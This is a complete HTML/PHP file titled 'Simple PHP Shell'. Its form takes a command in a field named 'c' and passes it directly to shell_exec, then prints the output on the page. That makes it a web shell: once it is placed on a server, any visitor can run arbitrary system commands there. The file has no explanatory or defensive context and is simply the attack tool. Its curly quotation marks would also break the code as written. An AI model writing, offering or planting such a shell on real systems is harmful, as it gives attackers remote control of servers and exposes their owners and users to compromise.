
<html>
<head>
<TITLE>Simple PHP Shell</TITLE>
</head>
<body>
<form action=”shell.php” method=post>
<input type=”text” NAME=”c”/>
<input name=”submit” type=submit value=”Command”>
</form>

<?php
if(isset($_REQUEST[‘submit’]))
{
$c = $_REQUEST[‘c’];
$output = shell_exec(“$c”);
echo “<pre>$output</pre>\n”;
}
?>
</body>
</html>